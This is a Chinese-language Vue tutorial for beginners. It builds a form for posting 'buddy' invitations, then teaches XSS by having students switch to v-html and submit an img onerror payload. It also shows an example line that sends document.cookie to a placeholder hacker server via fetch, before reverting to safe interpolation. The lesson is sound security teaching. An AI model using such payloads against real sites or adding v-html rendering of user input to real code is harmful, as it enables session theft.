# 2.1：自己动手发布邀请与“危险的输入”

**目标**：制作一个发布表单，让用户能自己发起“搭子邀请”，并初步认识网页是如何被黑客“控制”的。

---

### 第一步：回顾与准备

打开 VS Code 中的 `campus-buddy` 项目。
昨天我们是手动在代码里写死数据的，今天我们要写一个表单，让用户在网页上填完后，自动出现在列表里。

---

### 第二步：制作发布表单（UI 布局）

1. 在 `src/App.vue` 的 `<template>` 中，在“搜索框”和“列表”之间插入一段代码：
    
    ```
    <div class="add-box">
      <h3>📢 发起我的搭子邀请</h3>
      <input type="text" v-model="newBuddy.title" placeholder="你想做什么？(如：去图书馆)">
    
      <select v-model="newBuddy.category">
        <option value="运动">运动</option>
        <option value="学习">学习</option>
        <option value="美食">美食</option>
        <option value="游戏">游戏</option>
      </select>
    
      <input type="text" v-model="newBuddy.contact" placeholder="你的联系方式">
      <button @click="addBuddy" class="pub-btn">立即发布</button>
    </div>
    ```
    
2. 在 `<style>` 中添加表单美化样式：
    
    ```css
    .add-box {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      margin-bottom: 20px;
      border: 2px dashed #42b983; /* 虚线框表示这是一个功能区 */
    }
    .add-box input, .add-box select {
      display: block;
      width: 100%;
      margin-bottom: 10px;
      padding: 8px;
      border: 1px solid #ddd;
      border-radius: 4px;
      box-sizing: border-box; /* 防止输入框超出边界 */
    }
    .pub-btn {
      width: 100%;
      padding: 10px;
      background-color: #42b983;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    ```
    

---

### 第三步：编写发布逻辑（v-model 与数组操作）

我们要让 Vue 把填好的内容收集起来，塞进我们的“搭子仓库”里。

1. 在 `<script setup>` 中，先定义一个“空白表单”对象：
    
    ```jsx
    const newBuddy = ref({
      title: '',
      category: '运动',
      contact: ''
    })
    ```
    
2. 编写“点击发布”后的处理函数：
    
    ```jsx
    const addBuddy = () => {
      // 1. 简单的检查：如果标题为空，就不让发布
      if (newBuddy.value.title.trim() === '') {
        alert('请输入标题！')
        return
      }
    
      // 2. 创建一个新对象，把它塞进列表的最前面
      const buddy = {
        id: Date.now(), // 用当前时间作为临时 ID
        title: newBuddy.value.title,
        category: newBuddy.value.category,
        time: '刚刚发布',
        contact: newBuddy.value.contact
      }
    
      // 3. 把新搭子加到正在显示的列表里，同时也加到“全量仓库”里
      buddyList.value.unshift(buddy)
      allBuddies.unshift(buddy)
    
      // 4. 发布完后，清空表单，方便下次填写
      newBuddy.value.title = ''
      newBuddy.value.contact = ''
      alert('发布成功！')
    }
    ```
    
3. **看结果**：去浏览器试一下，填好内容点击发布，下面是不是立刻多了一个新卡片？

---

### 第四步：安全挑战——“恶作剧”弹窗（初识 XSS）

**讲解**：现在我们的系统有一个“致命缺陷”。假设有一个坏同学，他不想找搭子，只想搞恶作剧。

1. **场景模拟**：
有些学生希望在标题里写点 HTML 标签来让文字变红，比如输入 `<b style="color:red">急求球友</b>`。
为了支持这个功能，有些开发者会把代码改成 `v-html`。
2. **修改代码（危险操作示范）**：
在 `App.vue` 的 `<template>` 列表卡片部分，找到显示标题的地方，把 `{{ item.title }}` 换成 `v-html`：
    
    ```
    <!-- 这是一个危险的改动！ -->
    <h3 v-html="item.title"></h3>
    ```
    
3. **开始“攻击”**：
回到浏览器，在发布邀请的标题框里，输入以下这段带有“病毒”的代码，并点击发布：
    
    ```html
    <img src=x onerror="alert('你被黑了！你的登录信息已被盗取！')">
    ```
    
4. **观察现象**：
你会发现，只要页面一刷新或者显示出这个新卡片，浏览器就会立刻跳出一个弹窗！

---

### 第五步：为什么这很危险？（原理剖析）

**讲解：**

- 刚才我们输入的代码里，`onerror` 属性的意思是：如果图片加载失败（我们故意让 `src=x` 加载失败），就执行后面的 JavaScript 代码。
- 今天我们只是弹了一个 `alert`，这只是个恶作剧。
- 但如果是真正的黑客，他会写：`onerror="fetch('黑客服务器?cookie=' + document.cookie)"`。这样，**每一个**打开这个页面的同学，他们的登录秘钥（Cookie）都会被悄悄发给黑客！

---

### 第六步：修复漏洞——回归安全的 Vue

1. **最简单的修复**：
永远优先使用 `{{ }}`（插值表达式）。Vue 会自动把 `<` 变成 `&lt;`，从而让脚本失效，只当做普通文本显示。
    
    **动作**：现在把刚才的 `v-html` 改回 `{{ item.title }}`。
    
    ```
    <!-- 变回安全的写法 -->
    <h3>{{ item.title }}</h3>
    ```
    
2. **看结果**：
现在那个弹窗还会出现吗？你应该能看到那串奇怪的 HTML 代码被原样打印出来了，而不会被执行。

---

### 第二日上午小结

1. **表单收集**：学会了用 `v-model` 绑定对象。
2. **动态更新**：学会了用 `unshift` 向列表添加新数据并让网页自动更新。
3. **XSS 攻击感知**：亲手模拟了一个弹窗攻击，知道了 `v-html` 是导致漏洞的元凶。
4. **安全准则**：**永远不要信任用户的输入！** 尽量不要在展示用户内容时使用 `v-html`。

**【如果你已完成，请尝试挑战】**：
在发布表单里增加一个“内容详情”的大输入框（`<textarea>`），并在卡片里也显示出来。测试一下，在详情里输入攻击代码还会不会弹窗？